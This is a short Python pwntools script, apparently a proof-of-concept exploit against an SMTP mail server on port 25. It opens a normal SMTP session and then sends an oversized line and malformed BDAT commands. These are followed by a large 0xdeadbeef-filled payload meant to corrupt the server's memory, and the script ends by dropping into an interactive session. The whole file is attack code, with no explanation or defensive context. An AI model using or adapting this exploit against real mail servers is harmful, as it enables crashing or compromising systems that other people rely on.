# pip install pwntools
from pwn import *

r = remote('localhost', 25)

r.recvline()
r.sendline("EHLO test")
r.recvuntil("250 HELP")
r.sendline("MAIL FROM:<test@localhost>")
r.recvline()
r.sendline("RCPT TO:<test@localhost>")
r.recvline()
#raw_input()
r.sendline('a'*0x1100+'\x7f')
#raw_input()
r.recvuntil('command')
r.sendline('BDAT 1')
r.sendline(':BDAT \x7f')
s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
r.send(s+ ':\r\n')
r.recvuntil('command')
#raw_input()
r.send('\n')
r.interactive()
exit()

